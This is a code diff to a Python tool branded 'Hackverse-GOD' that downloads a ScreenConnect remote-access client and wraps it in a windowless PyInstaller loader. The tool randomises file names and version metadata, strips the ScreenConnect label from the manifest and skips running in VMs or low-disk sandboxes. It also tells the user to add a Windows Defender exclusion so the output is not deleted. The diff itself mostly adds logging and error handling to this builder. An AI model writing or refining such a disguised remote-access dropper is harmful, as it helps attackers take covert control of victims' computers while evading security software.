@@ -12,6 +12,10 @@ import win32con
 import win32security
 import hashlib
 import datetime
+import logging
+
+# Setup logging to diagnose issues
+logging.basicConfig(filename='wrapper_log.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Function to generate a random string for unique file naming
 def random_string(length=8):
@@ -24,23 +28,35 @@ def random_function_name():
 # Function to check if running in an RDP session
 def is_rdp_session():
     try:
-        # Check SM_REMOTESESSION (0x1000) to detect RDP
         return win32api.GetSystemMetrics(0x1000) != 0
-    except Exception:
+    except Exception as e:
+        logging.error(f"RDP check failed: {e}")
         return False
 
 # Function to check if user has admin privileges
 def is_admin():
     try:
-        # Check for admin token
         hToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
         return win32security.GetTokenInformation(hToken, win32security.TokenElevationType) == 2
-    except Exception:
+    except Exception as e:
+        logging.error(f"Admin check failed: {e}")
+        return False
+
+# Function to check for PyInstaller
+def check_pyinstaller():
+    try:
+        subprocess.run(['pyinstaller', '--version'], capture_output=True, check=True)
+        logging.info("PyInstaller is installed and accessible.")
+        return True
+    except Exception as e:
+        logging.error(f"PyInstaller check failed: {e}")
+        print(f"[Hackverse-GOD] PyInstaller not found or inaccessible: {e}")
         return False
 
 # Function to download the ScreenConnect EXE
 def download_exe(url, output_path):
     print(f"[Hackverse-GOD] Downloading EXE from {url}...")
+    logging.info(f"Downloading EXE from {url}")
     try:
         response = requests.get(url, stream=True, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10)
         if response.status_code == 200:
@@ -49,40 +65,51 @@ def download_exe(url, output_path):
                     f.write(chunk)
             subprocess.run(['powershell', '-Command', f'Unblock-File -Path "{output_path}"'], check=True, capture_output=True)
             print(f"[Hackverse-GOD] EXE downloaded to {output_path}")
+            logging.info(f"EXE downloaded to {output_path}")
             return True
         else:
             print(f"[Hackverse-GOD] Failed to download EXE. Status code: {response.status_code}")
+            logging.error(f"Download failed with status code: {response.status_code}")
             return False
     except Exception as e:
         print(f"[Hackverse-GOD] Error downloading EXE: {e}")
+        logging.error(f"Download error: {e}")
         return False
 
 # Function to normalize file attributes
 def normalize_file_attributes(file_path):
     print(f"[Hackverse-GOD] Normalizing attributes for {file_path}...")
+    logging.info(f"Normalizing attributes for {file_path}")
     try:
         current_time = time.time()
         os.utime(file_path, (current_time, current_time))
         print(f"[Hackverse-GOD] File attributes normalized.")
+        logging.info("File attributes normalized.")
     except Exception as e:
         print(f"[Hackverse-GOD] Error normalizing attributes: {e}")
+        logging.error(f"Attribute normalization error: {e}")
 
 # Function to calculate file checksum
 def calculate_checksum(file_path):
     print(f"[Hackverse-GOD] Calculating checksum for {file_path}...")
+    logging.info(f"Calculating checksum for {file_path}")
     try:
         sha256 = hashlib.sha256()
         with open(file_path, 'rb') as f:
             for chunk in iter(lambda: f.read(4096), b""):
                 sha256.update(chunk)
-        return sha256.hexdigest()
+        checksum = sha256.hexdigest()
+        logging.info(f"Checksum calculated: {checksum}")
+        return checksum
     except Exception as e:
         print(f"[Hackverse-GOD] Error calculating checksum: {e}")
+        logging.error(f"Checksum error: {e}")
         return None
 
 # Function to check execution environment
 def is_safe_environment():
     print(f"[Hackverse-GOD] Checking execution environment...")
+    logging.info("Checking execution environment")
     try:
         vm_indicators = [
             r"C:\Program Files\VMware",
@@ -92,14 +119,18 @@ def is_safe_environment():
         for indicator in vm_indicators:
             if os.path.exists(indicator):
                 print(f"[Hackverse-GOD] VM environment detected: {indicator}")
+                logging.warning(f"VM environment detected: {indicator}")
                 return False
         total, used, free = shutil.disk_usage(os.path.dirname(__file__))
         if free < 1024 * 1024 * 100:  # Less than 100MB free
             print(f"[Hackverse-GOD] Low disk space detected, possible sandbox.")
+            logging.warning("Low disk space detected, possible sandbox.")
             return False
+        logging.info("Safe environment confirmed.")
         return True
     except Exception as e:
         print(f"[Hackverse-GOD] Error checking environment: {e}")
+        logging.error(f"Environment check error: {e}")
         return True  # Assume safe if check fails
 
 # Function to create the loader Python script with randomization
@@ -199,6 +230,7 @@ if __name__ == "__main__":
     with open(loader_script_path, 'w') as f:
         f.write(loader_code)
     print(f"[Hackverse-GOD] Loader script created at {loader_script_path}")
+    logging.info(f"Loader script created at {loader_script_path}")
 
 # Function to create an embedded manifest
 def create_manifest_file():
@@ -218,14 +250,16 @@ def create_manifest_file():
       <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
     </windowsSettings>
   </application>
-  <description>ScreenConnect Installer Wrapper</description>
+  <description>Application Wrapper</description>
 </assembly>
 """
     with open(manifest_file_path, 'w') as f:
         f.write(manifest)
+    print(f"[Hackverse-GOD] Manifest created at {manifest_file_path}")
+    logging.info(f"Manifest created at {manifest_file_path}")
     return manifest_file_path
 
-# Function to create minimal version file to avoid trust
+# Function to create minimal version file with fake signature placeholder
 def create_version_file():
     version_file_path = os.path.join(tempfile.gettempdir(), f"version_{random_string()}.txt")
     version_info = f"""
@@ -246,7 +280,8 @@ VSVersionInfo(
         StringStruct('FileDescription', 'Installer_{random_string(4)}'),
         StringStruct('FileVersion', '1.0.{random.randint(1, 999)}.0'),
         StringStruct('InternalName', 'App_{random_string(4)}'),
-        StringStruct('OriginalFilename', 'ScreenConnectWrapped.exe')
+        StringStruct('OriginalFilename', 'ScreenConnectWrapped.exe'),
+        StringStruct('Comments', 'Unsigned application with placeholder signature')
       ]
     ),
     VarFileInfo([VarStruct('Translation', [0x0409, 1252])])
@@ -255,11 +290,14 @@ VSVersionInfo(
 """
     with open(version_file_path, 'w') as f:
         f.write(version_info)
+    print(f"[Hackverse-GOD] Version file created at {version_file_path}")
+    logging.info(f"Version file created at {version_file_path}")
     return version_file_path
 
 # Function to compile the loader and wrap the ScreenConnect EXE
 def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_exe_path):
     print(f"[Hackverse-GOD] Compiling loader and wrapping ScreenConnect EXE into {output_exe_path}...")
+    logging.info(f"Compiling loader into {output_exe_path}")
     try:
         unique_name = f"SCWrapped_{random_string()}"
         temp_bundle_dir = os.path.join(tempfile.gettempdir(), f"bundle_{random_string()}")
@@ -270,7 +308,7 @@ def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_e
         normalize_file_attributes(bundled_exe_path)
         
         separator = ';' if os.name == 'nt' else ':'
-        subprocess.run([
+        pyinstaller_cmd = [
             'pyinstaller',
             '--onefile',
             '--noconsole',
@@ -281,7 +319,13 @@ def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_e
             '--add-data', f"{bundled_exe_path}{separator}.",
             '--manifest', create_manifest_file(),
             loader_script_path
-        ], check=True, capture_output=True)
+        ]
+        logging.info(f"Running PyInstaller command: {' '.join(pyinstaller_cmd)}")
+        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)
+        if result.returncode != 0:
+            print(f"[Hackverse-GOD] PyInstaller failed: {result.stderr}")
+            logging.error(f"PyInstaller failed: {result.stderr}")
+            return False
         
         compiled_exe = os.path.join('dist', f"{unique_name}.exe")
         if os.path.exists(compiled_exe):
@@ -292,36 +336,55 @@ def compile_loader_with_exe(loader_script_path, screenconnect_exe_path, output_e
             shutil.rmtree(temp_bundle_dir, ignore_errors=True)
             subprocess.run(['powershell', '-Command', f'Unblock-File -Path "{output_exe_path}"'], check=True, capture_output=True)
             print(f"[Hackverse-GOD] Wrapped EXE compiled to {output_exe_path}")
+            logging.info(f"Wrapped EXE compiled to {output_exe_path}")
             return True
         else:
-            print(f"[Hackverse-GOD] Compilation failed: Output executable not found.")
+            print(f"[Hackverse-GOD] Compilation failed: Output executable not found at {compiled_exe}")
+            logging.error(f"Output executable not found at {compiled_exe}")
             return False
     except subprocess.CalledProcessError as e:
         print(f"[Hackverse-GOD] Error compiling loader: {e}")
+        logging.error(f"Compilation error: {e}")
         return False
     except Exception as e:
         print(f"[Hackverse-GOD] Error during compilation: {e}")
+        logging.error(f"Compilation error: {e}")
         return False
 
 # Main function
 def main():
     print("[Hackverse-GOD] Initiating ScreenConnect EXE wrapper creation in HACKVERSE-DOMINION MODE...")
+    logging.info("Script started")
     
-    # Check if script is running with admin privileges
     if is_admin():
         print("[Hackverse-GOD] Script running with admin privileges, aborting to avoid UAC issues.")
+        logging.error("Script aborted due to admin privileges")
+        return
+    
+    if not check_pyinstaller():
+        print("[Hackverse-GOD] Aborting due to PyInstaller issues. Ensure PyInstaller is installed and accessible.")
+        logging.error("Script aborted due to PyInstaller issues")
         return
     
     exe_url = input("[Hackverse-GOD] Enter the ScreenConnect client EXE build link: ")
+    logging.info(f"Provided ScreenConnect URL: {exe_url}")
     
-    temp_dir = tempfile.mkdtemp()
+    # Use user home directory for output to avoid permission issues
+    output_dir = os.path.expanduser("~/ScreenConnectWrapper")
+    os.makedirs(output_dir, exist_ok=True)
+    temp_dir = os.path.join(output_dir, f"temp_{random_string()}")
+    os.makedirs(temp_dir, exist_ok=True)
     exe_path = os.path.join(temp_dir, f"ScreenConnect_{random_string()}.exe")
     loader_script_path = os.path.join(temp_dir, f"loader_{random_string()}.py")
-    output_exe_path = f"ScreenConnectWrapped_{random_string()}.exe"
+    output_exe_path = os.path.join(output_dir, f"ScreenConnectWrapped_{random_string()}.exe")
+
+    print(f"[Hackverse-GOD] Output will be saved to {output_exe_path}")
+    logging.info(f"Output path: {output_exe_path}")
 
     # Step 1: Download the EXE
     if not download_exe(exe_url, exe_path):
         print("[Hackverse-GOD] Aborting due to download failure.")
+        logging.error("Aborted due to download failure")
         shutil.rmtree(temp_dir, ignore_errors=True)
         return
 
@@ -330,6 +393,7 @@ def main():
     checksum = calculate_checksum(exe_path)
     if not checksum:
         print("[Hackverse-GOD] Aborting due to checksum failure.")
+        logging.error("Aborted due to checksum failure")
         shutil.rmtree(temp_dir, ignore_errors=True)
         return
 
@@ -339,12 +403,16 @@ def main():
     # Step 4: Compile loader and wrap with ScreenConnect EXE
     if not compile_loader_with_exe(loader_script_path, exe_path, output_exe_path):
         print("[Hackverse-GOD] Aborting due to compilation failure.")
+        logging.error("Aborted due to compilation failure")
         shutil.rmtree(temp_dir, ignore_errors=True)
         return
 
     # Step 5: Clean up temporary files
     shutil.rmtree(temp_dir, ignore_errors=True)
     print(f"[Hackverse-GOD] Mission complete. Output EXE: {output_exe_path}")
+    logging.info(f"Mission complete. Output EXE: {output_exe_path}")
+    print("[Hackverse-GOD] If the output EXE is deleted by Windows Security, add an exclusion for the output directory:")
+    print(f"[Hackverse-GOD] powershell -Command \"Add-MpPreference -ExclusionPath '{output_dir}'\"")
 
 if __name__ == "__main__":
     main()
